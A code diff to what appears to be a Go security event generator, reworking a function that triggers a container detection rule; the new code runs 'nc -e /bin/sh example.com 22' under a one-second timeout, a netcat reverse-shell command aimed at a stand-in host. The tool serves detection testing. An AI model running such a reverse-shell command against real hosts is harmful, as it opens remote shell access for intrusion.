@@ -23,17 +23,25 @@ import (
 var _ = events.Register(NetcatRemoteCodeExecutionInContainer)
 
 func NetcatRemoteCodeExecutionInContainer(h events.Helper) error {
-	if h.InContainer() {
-		// Launch netcat (nc) with the -e flag for remote code execution
-		cmd := exec.Command("nc", "-e")
-
-		h.Log().Info("Netcat runs inside container that allows remote code execution")
-		err := cmd.Run()
-		if err != nil {
-			return err
+	if !h.InContainer() {
+		return &events.ErrSkipped{
+			Reason: "only applicable to containers",
 		}
 	}
-	return &events.ErrSkipped{
-		Reason: "'Netcat Remote Code Execution In Container' is applicable only to containers.",
+
+	nc, err := exec.LookPath("nc")
+	if err != nil {
+		// if we don't have a netcat, just bail
+		return &events.ErrSkipped{
+			Reason: "netcat executable file not found in $PATH",
+		}
 	}
+
+	// launch netcat (nc) with the -e flag for remote code execution
+	// note: executing the following command might fail, but enough to trigger the rule, so we ignore any error
+	if err := exec.Command("timeout", "1s", nc, "-e", "/bin/sh", "example.com", "22").Run(); err != nil {
+		h.Log().WithError(err).Debug("failed to run nc command (this is expected)")
+	}
+
+	return nil
 }
